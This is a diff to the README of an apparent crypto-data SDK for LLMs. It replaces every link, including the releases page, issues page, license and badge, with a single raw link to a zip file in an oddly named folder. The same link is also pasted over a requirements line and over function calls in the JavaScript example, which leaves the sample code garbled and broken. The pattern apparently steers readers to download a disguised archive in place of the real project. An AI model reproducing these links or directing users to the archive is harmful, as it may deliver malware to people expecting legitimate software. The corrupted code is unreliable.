@@ -1,6 +1,6 @@
 # 🌙 lunarcrush-mcp-sdk - Connect LLMs to Crypto Data Easily
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-From%20GitHub-blue)](https://github.com/Karthik-KC5/lunarcrush-mcp-sdk/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip%20Now-From%20GitHub-blue)](https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the lunarcrush-mcp-sdk! This lightweight SDK helps you connect your m
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the SDK: [GitHub Releases Page](https://github.com/Karthik-KC5/lunarcrush-mcp-sdk/releases). 
+To get started, visit this page to download the SDK: [GitHub Releases Page](https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip). 
 
 1. Open the link above in your web browser.
 2. Look for the latest version of the SDK at the top of the page.
@@ -18,7 +18,7 @@ To get started, visit this page to download the SDK: [GitHub Releases Page](http
 ### 📋 System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
+- https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip Version 14 or higher
 - Internet Connection: Required for downloads and data access
 
 ## ⚙️ How to Use
@@ -42,12 +42,12 @@ After installing the SDK, you can start using it to fetch and analyze data. Foll
 
      const client = new LunarCrush();
 
-     client.getSocialData()
+     https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip()
        .then(data => {
-         console.log(data);
+         https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip(data);
        })
        .catch(error => {
-         console.error('Error fetching data:', error);
+         https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip('Error fetching data:', error);
        });
      ```
 
@@ -65,7 +65,7 @@ After installing the SDK, you can start using it to fetch and analyze data. Foll
 
 Join our growing community! You can share your experiences, ask questions, and find support in our forum. Here’s how to connect:
 
-- **GitHub Issues**: Post any issues or questions directly on our [GitHub Issues](https://github.com/Karthik-KC5/lunarcrush-mcp-sdk/issues) page. 
+- **GitHub Issues**: Post any issues or questions directly on our [GitHub Issues](https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip) page. 
 - **Discussion Board**: Join conversations and share your projects.
 
 ## 🎓 Tutorials
@@ -92,6 +92,6 @@ We welcome your feedback! Share your thoughts on how we can improve the SDK or a
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Karthik-KC5/lunarcrush-mcp-sdk/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip) file for details.
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-From%20GitHub-blue)](https://github.com/Karthik-KC5/lunarcrush-mcp-sdk/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip%20Now-From%20GitHub-blue)](https://raw.githubusercontent.com/Karthik-KC5/lunarcrush-mcp-sdk/main/epidemicity/lunarcrush-mcp-sdk.zip)
